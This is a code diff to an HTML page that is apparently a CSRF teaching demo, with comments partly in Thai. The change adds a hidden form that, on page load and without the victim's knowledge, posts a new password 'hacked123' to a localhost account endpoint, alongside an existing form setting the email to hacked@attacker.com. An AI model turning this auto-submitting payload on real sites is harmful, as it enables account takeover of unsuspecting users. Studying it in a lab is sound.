@@ -71,12 +71,19 @@
     <input type="hidden" name="email" value="hacked@attacker.com">
   </form>
 
+  <!-- CSRF Attack: Change Password -->
+  <form id="csrf-password-form" method="POST" action="" style="display:none;">
+    <input type="hidden" name="password" value="hacked123">
+  </form>
+
   <script>
     // Auto-submit เมื่อโหลดหน้า — victim ไม่รู้ตัว
-    var form = document.getElementById('csrf-form');
-    // ใช้ TARGET_PORT จาก config.js
     var port = (typeof TARGET_PORT !== 'undefined') ? TARGET_PORT : 5000;
-    form.action = "http://localhost:" + port + "/account/edit";
+    
+    // Choose which attack to perform (or do both sequentially)
+    // For demo, we'll change the password
+    var form = document.getElementById('csrf-password-form');
+    form.action = "http://localhost:" + port + "/account/password";
     form.submit();
 
     setTimeout(function () {
